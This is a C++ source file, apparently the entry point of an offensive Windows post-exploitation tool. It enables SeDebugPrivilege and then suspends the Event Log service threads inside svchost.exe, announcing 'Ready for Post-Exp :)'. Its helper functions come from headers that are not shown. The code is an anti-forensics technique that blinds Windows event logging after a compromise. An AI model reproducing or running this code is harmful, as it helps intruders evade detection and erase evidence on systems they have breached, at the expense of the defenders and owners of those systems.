//#include <iostream>
//#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string>

//#pragma comment(lib,"Advapi32.lib")		// For I_QueryTagInformation

//#include "Helper.h"
#include "SeDebugPrivilege.h"
#include "SuspendEventLog.h"

#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions

/*
#define NT_SUCCESS(Status)	(((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h

EXTERN_C NTSTATUS NtOpenProcessToken(
	IN HANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	OUT PHANDLE TokenHandle
);

EXTERN_C NTSTATUS NtAdjustPrivilegesToken(
	IN HANDLE TokenHandle,
	IN BOOLEAN DisableAllPrivileges,
	IN PTOKEN_PRIVILEGES TokenPrivileges,
	IN ULONG PreviousPrivilegesLength,
	OUT PTOKEN_PRIVILEGES PreviousPrivileges OPTIONAL,
	OUT PULONG RequiredLength OPTIONAL
);

EXTERN_C NTSTATUS NtQueryInformationThread(
	IN HANDLE          ThreadHandle,
	IN THREADINFOCLASS ThreadInformationClass,
	OUT PVOID          ThreadInformation,
	IN ULONG           ThreadInformationLength,
	OUT PULONG         ReturnLength
);
*/

// If POBJECT_ATTRIBUTES issue is resolved us this instead of OpenThread
/*
EXTERN_C NTSTATUS NtOpenThread(
	OUT PHANDLE            ThreadHandle,
	IN  ACCESS_MASK        DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes,
	IN  PCLIENT_ID         ClientId
);
*/

int main()
{
	//printf("Before: Sleeping...\n");

	//getchar();

	// 1. WORK1

	// Update current process with SeDebugPrivilege Token (if admin priv)
	if (UpdatePriv(SE_DEBUG_NAME) == 0)
	{
		printf("\n[+] SeDebugPrivilege Enabled!\n");
	}
	else
	{
		// Exit!
		return -1;
	}

	//printf("After: Sleeping...\n");

	//Sleep(1000000);

	// 2. WORK2

	// Suspending EventLog Threads from the responsible svchost.exe process
	if (SuspendEventLogThreads() == 0)
	{
		printf("\n[+] Ready for Post-Exp :)\n");
	}
	else
	{
		// Exit!
		return -1;
	}

    return 0;
}